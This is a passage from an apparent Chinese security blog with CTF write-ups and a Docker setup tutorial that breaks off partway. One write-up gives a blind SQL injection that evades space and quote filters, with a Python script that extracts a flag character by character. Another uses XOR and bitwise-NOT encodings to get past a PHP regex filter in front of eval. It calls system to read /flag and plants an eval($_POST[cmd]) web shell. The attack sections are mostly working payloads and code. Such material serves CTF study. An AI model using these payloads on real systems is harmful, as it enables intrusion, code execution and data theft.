<p>这里过滤了空格，可以直接<code>\t</code>来代替空格，也就是<code>%09</code>,在写脚本时候可以使⽤<code>TAB</code>键来代替。</p>
<p>同时过滤了单双引号，可以使⽤⼗六进制来代替字符串。</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="if函数"><a href="#if函数" class="headerlink" title="if函数"></a>if函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(expr1,expr2,expr3)</span><br></pre></td></tr></table></figure>

<p>判断语句，类似C语言的三目运算符 </p>
<p>如果第一个语句正确，就执行第二个语句，如果错误，执行第三个语句</p>
<h3 id="ST-GeomFromText"><a href="#ST-GeomFromText" class="headerlink" title="ST_GeomFromText"></a>ST_GeomFromText</h3><h5 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h5><p> 接受一个以Well-Known Text(WKT)表示的几何对象字符串为输入，输出一个几何对象。</p>
<p>基于源字符串返回相应类型的几何值。                                                      </p>
<h5 id="函数声明"><a href="#函数声明" class="headerlink" title="函数声明"></a>函数声明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">geometry ST_GeomFromText(text  WKT);</span><br><span class="line">geometry ST_GeomFromText(text  WKT, integer  srid);</span><br></pre></td></tr></table></figure>

<h5 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT ST_GeomFromText(&#39;POINT(-71.064544 42.28787)&#39;);</span><br><span class="line">SELECT ST_GeomFromText(&#39;LINESTRING(-71.160281 42.258729,-71.160837 42.259113,-71.161144 42.25932)&#39;);</span><br><span class="line">SELECT ST_GeomFromText(&#39;LINESTRING(-71.160281 42.258729,-71.160837 42.259113,-71.161144 42.25932)&#39;,4269);</span><br><span class="line">SELECT ST_GeomFromText(&#39;MULTILINESTRING((-71.160281 42.258729,-71.160837 42.259113,-71.161144 42.25932))&#39;);</span><br></pre></td></tr></table></figure>

<h3 id="ST-MPointFromText"><a href="#ST-MPointFromText" class="headerlink" title="ST_MPointFromText"></a>ST_MPointFromText</h3><h5 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h5><p>从给定的WKT表示法字符串和SRID来构造一个MultiPoint几何对象，如果SRID未指定，则默认为0。</p>
<h5 id="函数声明-1"><a href="#函数声明-1" class="headerlink" title="函数声明"></a>函数声明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">geometry ST_MPointFromText(text  WKT, integer  srid);</span><br><span class="line">geometry ST_MPointFromText(text  WKT);</span><br></pre></td></tr></table></figure>

<h5 id="使用示例-1"><a href="#使用示例-1" class="headerlink" title="使用示例"></a>使用示例</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT ST_MPointFromText(&#39;MULTIPOINT(1 2, 3 4)&#39;);</span><br><span class="line">SELECT ST_MPointFromText(&#39;MULTIPOINT(-70.9590 42.1180, -70.9611 42.1223)&#39;, 4326);</span><br></pre></td></tr></table></figure>

<h3 id="其他可⽤函数"><a href="#其他可⽤函数" class="headerlink" title="其他可⽤函数"></a>其他可⽤函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT IF(&#123;&#125;, ST_X(ST_GeomFromText(&#39;POINT(mads)&#39;)), 0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_MPointFromText(&#39;MULTIPOINT (mads)&#39;),0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_X(MADS), 0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_MPointFromText(&#39;MADS&#39;),0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_GeomFromText(&#39;MADS&#39;),0);</span><br></pre></td></tr></table></figure>



<p>使⽤<strong>ST_GeomFromText</strong>来解这道题，构造如下payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?cat&#x3D;1%09and%09IF(0,ST_X(ST_GeomFromText(0x504F494E54286D61647329)),0)</span><br></pre></td></tr></table></figure>



<h5 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span>(<span class="params">string</span>):</span></span><br><span class="line">	result = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">		r = hex(ord(i));</span><br><span class="line">		r = r.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">		result = result+r</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+result</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://47.98.234.232:28050/index.php?cat=&quot;</span></span><br><span class="line">tables = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-&#125;&#123;&#x27;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">70</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> tables:</span><br><span class="line">		<span class="keyword">if</span> j ==<span class="string">&quot;&#123;&quot;</span> <span class="keyword">or</span> j==<span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">			j=<span class="string">&#x27;\\&#x27;</span>+j</span><br><span class="line">		payload = <span class="string">&quot;1	and	IF((select	flag	from	flag)	regexp	binary	%s,0,ST_X(111))&quot;</span>%(ord2hex(<span class="string">&quot;^&quot;</span>+result+j))</span><br><span class="line">		r = requests.get(url+payload);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>  r.status_code==<span class="number">200</span>:</span><br><span class="line">			result=result+j</span><br><span class="line">			print(result.replace(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>要注意在花括号前面加入转义字符，因为{被当作了正则表达式里面的标记限定符，否则会报错</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/3.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2020/12/23/PHP%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E5%90%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/23/PHP%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E5%90%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/" class="post-title-link" itemprop="url">PHP正则匹配后代码执行的一些绕过方法</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2020-12-23 00:00:00 / 修改时间：19:14:51" itemprop="dateCreated datePublished" datetime="2020-12-23T00:00:00+08:00">2020-12-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h2><p>两个字符串异或之后，得到一个字符串。</p>
<p>当正则匹配过滤了一些字符串时，就可以使用两个不在正则匹配范围内的字符串进行异或得到我们想要的字符串。</p>
<p>异或的符号是<code>^</code></p>
<p>例如：异或 <strong>‘?’</strong> 和 <strong>‘~’</strong> 之后，得到 <strong>‘A’</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;?&#x27;</span>^<span class="string">&#x27;~&#x27;</span>;</span><br><span class="line"><span class="comment">//输出A</span></span><br></pre></td></tr></table></figure>

<h4 id="异或脚本"><a href="#异或脚本" class="headerlink" title="异或脚本"></a>异或脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">128</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(<span class="string">&quot;%s^%s&quot;</span>,urlencode(chr($i)),urlencode(chr(<span class="number">255</span>))).<span class="string">&quot;=&gt;&quot;</span>. (chr($i)^chr(<span class="number">255</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行该脚本可以得到：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">%81^%FF&#x3D;&gt;~     %82^%FF&#x3D;&gt;&#125;       %83^%FF&#x3D;&gt;|</span><br><span class="line">%84^%FF&#x3D;&gt;&#123;     %85^%FF&#x3D;&gt;z       %86^%FF&#x3D;&gt;y</span><br><span class="line">%87^%FF&#x3D;&gt;x     %88^%FF&#x3D;&gt;w       %89^%FF&#x3D;&gt;v</span><br><span class="line">%8A^%FF&#x3D;&gt;u     %8B^%FF&#x3D;&gt;t       %8C^%FF&#x3D;&gt;s</span><br><span class="line">%8D^%FF&#x3D;&gt;r     %8E^%FF&#x3D;&gt;q       %8F^%FF&#x3D;&gt;p</span><br><span class="line">%90^%FF&#x3D;&gt;o     %91^%FF&#x3D;&gt;n       %92^%FF&#x3D;&gt;m</span><br><span class="line">%93^%FF&#x3D;&gt;l     %94^%FF&#x3D;&gt;k       %95^%FF&#x3D;&gt;j</span><br><span class="line">%96^%FF&#x3D;&gt;i     %97^%FF&#x3D;&gt;h       %98^%FF&#x3D;&gt;g</span><br><span class="line">%99^%FF&#x3D;&gt;f     %9A^%FF&#x3D;&gt;e       %9B^%FF&#x3D;&gt;d</span><br><span class="line">%9C^%FF&#x3D;&gt;c     %9D^%FF&#x3D;&gt;b       %9E^%FF&#x3D;&gt;a</span><br><span class="line">%9F^%FF&#x3D;&gt;&#96;     %A0^%FF&#x3D;&gt;_       %A1^%FF&#x3D;&gt;^</span><br><span class="line">%A2^%FF&#x3D;&gt;]     %A3^%FF&#x3D;&gt;\       %A4^%FF&#x3D;&gt;[</span><br><span class="line">%A5^%FF&#x3D;&gt;Z     %A6^%FF&#x3D;&gt;Y       %A7^%FF&#x3D;&gt;X</span><br><span class="line">%A8^%FF&#x3D;&gt;W     %A9^%FF&#x3D;&gt;V       %AA^%FF&#x3D;&gt;U</span><br><span class="line">%AB^%FF&#x3D;&gt;T     %AC^%FF&#x3D;&gt;S       %AD^%FF&#x3D;&gt;R    </span><br><span class="line">%AE^%FF&#x3D;&gt;Q     %AF^%FF&#x3D;&gt;P       %B0^%FF&#x3D;&gt;O</span><br><span class="line">%B1^%FF&#x3D;&gt;N     %B2^%FF&#x3D;&gt;M       %B3^%FF&#x3D;&gt;L</span><br><span class="line">%B4^%FF&#x3D;&gt;K     %B5^%FF&#x3D;&gt;J       %B6^%FF&#x3D;&gt;I</span><br><span class="line">%B7^%FF&#x3D;&gt;H     %B8^%FF&#x3D;&gt;G       %B9^%FF&#x3D;&gt;F</span><br><span class="line">%BA^%FF&#x3D;&gt;E     %BB^%FF&#x3D;&gt;D       %BC^%FF&#x3D;&gt;C</span><br><span class="line">%BD^%FF&#x3D;&gt;B     %BE^%FF&#x3D;&gt;A       %BF^%FF&#x3D;&gt;@</span><br><span class="line">%C0^%FF&#x3D;&gt;?</span><br></pre></td></tr></table></figure>

<p>通过上面就可以知道哪两个字符异或可以得到我们想要的字符</p>
<p>用这种方法构造一个phpinfo()函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br></pre></td></tr></table></figure>

<p>其中，<code>%ff%ff%ff%ff^%a0%b8%ba%ab</code>就是_GET</p>
<p>将其url解码，再异或得到的就是<code>_GET</code>。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a = urldecode(<span class="string">&#x27;%ff%ff%ff%ff&#x27;</span>);</span><br><span class="line">$b = urldecode(<span class="string">&#x27;%a0%b8%ba%ab&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a^$b;</span><br><span class="line"><span class="comment">//输出_GET：%A0^%FF=&gt;_  %B8^%FF=&gt;G  %BA^%FF=&gt;E  %AB^%FF=&gt;T </span></span><br></pre></td></tr></table></figure>

<p>注：这里字母大小写没有影响</p>
<h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]) )&#123;</span><br><span class="line">  <span class="keyword">eval</span>($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里传入的参数是a，我们可以试一下上面说的phpinfo()函数</p>
<p>输入网址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.98.234.232:28002&#x2F;?a&#x3D;$&#123;%ff%ff%ff%ff^%A0%B8%BA%AB&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E5%8F%96%E5%8F%8D%E3%80%82%E3%80%82.png"></p>
<p>我们要得到flag，就需要传入两个参数，一个是system，<code>system</code>函数执行命令， 并输出执行结果；另一个就是cat /flag</p>
<p>因此<code>%ff%ff%ff%ff^%a0%b8%ba%ab</code>需要构造两次</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.98.234.232:28021&#x2F;?a&#x3D;$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%ff&#125;($&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;&#123;%a0&#125;);&amp;%ff&#x3D;system&amp;%a0&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E5%BC%82%E6%88%96.png"></p>
<h2 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h2><p>取反的符号是<code>~</code>。</p>
<p>在数值的二进制表示方式上，将0变为1，将1变为0。</p>
<h4 id="取反脚本"><a href="#取反脚本" class="headerlink" title="取反脚本"></a>取反脚本</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">$a = urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">//%8F%97%8F%96%91%99%90</span></span><br></pre></td></tr></table></figure>

<p>对phpinfo取反后再进行url编码</p>
<p>可以构造出<code>phpinfo()</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E5%8F%96%E5%8F%8D1.png"></p>
<h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">if(!preg_match(&#39;&#x2F;[a-zA-z0-9]|\&amp;|\^|#|\$|%&#x2F;&#39;, $_GET[&#39;a&#39;]))&#123;</span><br><span class="line">       eval($_GET[&#39;a&#39;]);</span><br><span class="line">     &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>过滤了<code>^</code>，不能用异或绕过，可以用取反绕过。</p>
<p><strong>构造assert字符</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$c=<span class="string">&#x27;(eval($_POST[cmd]))&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(~$c);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//%9E%8C%8C%9A%8D%8B</span></span><br><span class="line"><span class="comment">//%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6</span></span><br></pre></td></tr></table></figure>

<p>assert()函数：检查一个断言是否为 <strong><code>false</code></strong></p>
<p>输入网址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;47.98.234.232:28096&#x2F;?a&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6);</span><br></pre></td></tr></table></figure>

<p>出现Assertion “(eval($_POST[cmd]))”，于是打开HackBar，选择Post data，输入<code>cmd=system(&quot;cat /flag&quot;); </code>点击Execute，即可得到flag。</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E5%8F%96%E5%8F%8Dflag.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2020/12/23/%E5%85%B3%E4%BA%8EDocker%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/12/23/%E5%85%B3%E4%BA%8EDocker%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="post-title-link" itemprop="url">关于Docker的一些基础知识</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-12-23 00:00:00" itemprop="dateCreated datePublished" datetime="2020-12-23T00:00:00+08:00">2020-12-23</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-12-24 00:36:39" itemprop="dateModified" datetime="2020-12-24T00:36:39+08:00">2020-12-24</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="Docker是什么"><a href="#Docker是什么" class="headerlink" title="Docker是什么"></a>Docker是什么</h3><p>Docker 是一个开源的应用容器引擎， 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p>
<p>容器是完全使用沙箱机制，相互之间不会有任何接口</p>
<p>docker可以理解为一个用来装应用的容器，可以放网站，或者程序</p>
<p><strong>三个基本概念</strong></p>
<p>镜像（Image）：相当于一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。</p>
<p>容器（Container）：镜像和容器的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p>
<p>仓库（Repository）：仓库可看成一个代码控制中心，用来保存镜像。</p>
<h3 id="安装环境及要求"><a href="#安装环境及要求" class="headerlink" title="安装环境及要求"></a>安装环境及要求</h3><p> (1)Linux 系统,如是 CentOS 内核要求高于 3.10,查询命令:uname -r </p>
<p>(2)源需要当前最高版本,更新命令：</p>
<p> ①yum 源:sudo yum update</p>
<p>② apt 源:sudo apt-get update</p>
<p>由于我购买了阿里云服务器，基于CentOS安装，因此下面只记录基于CentOS的安装方法。</p>
<h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><p>**安装必须的软件依赖包 **</p>
<p>安 装 yum-utils( 它 提 供 一 个 yum-config-manager 单 元 )，同 时 需 要 安 装 device-mapper-persistent-data 和 lvm2 用于储存设备的映射</p>
<p>安装命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y yum-utils device-mapper-persistent-data lvm2</span><br></pre></td></tr></table></figure>

<p>**设置 yum 源 **</p>
<p>设置 yum 源用于连接 docker 厂库为下一步安装 docker 作准备</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo</span><br></pre></td></tr></table></figure>

<p><strong>查看仓库中所有的 Docker 版本</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum list docker-ce --showduplicates | sort -r</span><br></pre></td></tr></table></figure>

<p><strong>选择 docker 版本并使用 yum 安装</strong>（此命令直接安装最新版本的 docker）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install docker-ce</span><br></pre></td></tr></table></figure>

<p><strong>设置 docker 开机启动/启动 docker 服务</strong> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker sudo systemctl enable docker </span><br></pre></td></tr></table></figure>

<p><strong>校验是否安装成功</strong></p>
<p>查看 docker 版本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker version</span><br></pre></td></tr></table></figure>



<h3 id="部署-Docker-可视化管理平台——Portainer"><a href="#部署-Docker-可视化管理平台——Portainer" class="headerlink" title="部署 Docker 可视化管理平台——Portainer"></a>部署 Docker 可视化管理平台——Portainer</h3><p><strong>创建分区-portainer_data</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker volume create portainer_data </span><br></pre></td></tr></table></figure>

<p><strong>直接从 docker 厂库拉取 portainer 下来</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 9000:9000 -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock portainer&#x2F;portainer</span><br></pre></td></tr></table></figure>

<p> 注： docker run(启动一个镜像并放入容器中)如果没有这个镜像将会在 docker 仓库中自动拉取最 新版本 </p>
<p>-d 参数为后台运行 </p>
<p>-p 9000:9000 将物理机的 9000 端口暴露给 docker 容器中的 9000 端口 </p>
<p>-v /var…:/var… 将物理机中的目录映射给 docker 中的对应目录(由于 docker 在重启后容器将 会全部消失，所以为了保证 docker 中的文件不会消失所以需要作目录映射)</p>
<p><strong>安装后访问<IP>:9000 就可以可视化使用 docker</strong></p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/docker.png"></p>
<h3 id="docker镜像加速"><a href="#docker镜像加速" class="headerlink" title="docker镜像加速"></a>docker镜像加速</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p &#x2F;etc&#x2F;docker</span><br><span class="line">sudo tee &#x2F;etc&#x2F;docker&#x2F;daemon.json &lt;&lt;-&#39;EOF&#39;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [ &quot;https:&#x2F;&#x2F;fpr97nhz.mirror.aliyuncs.com&quot; ]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<h3 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a>docker常用命令</h3><h5 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 